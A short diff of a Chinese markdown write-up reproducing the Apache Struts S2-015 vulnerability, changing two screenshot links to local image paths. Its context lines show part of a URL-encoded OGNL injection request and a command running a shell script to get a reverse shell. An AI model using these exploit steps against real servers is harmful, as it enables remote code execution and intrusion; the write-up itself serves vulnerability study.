@@ -57,7 +57,7 @@ GET /S2-015/%24%7b%23%63%6f%6e%74%65%78%74%5b%27%78%77%6f%72%6b%2e%4d%65%74%68%6
 
 直接回显：
 
-![image-20220301185208869](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011852988.png)
+![image-20220301185208869](./images/202203011852988.png)
 
 除了上面所说到的这种情况以外，S2-015 还涉及一种二次引用执行的情况：
 
@@ -121,5 +121,5 @@ bash /usr/local/tomcat/shell.sh
 
 成功接收反弹shell：
 
-![image-20220301190047036](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202203011900116.png)
+![image-20220301190047036](./images/202203011900116.png)
 
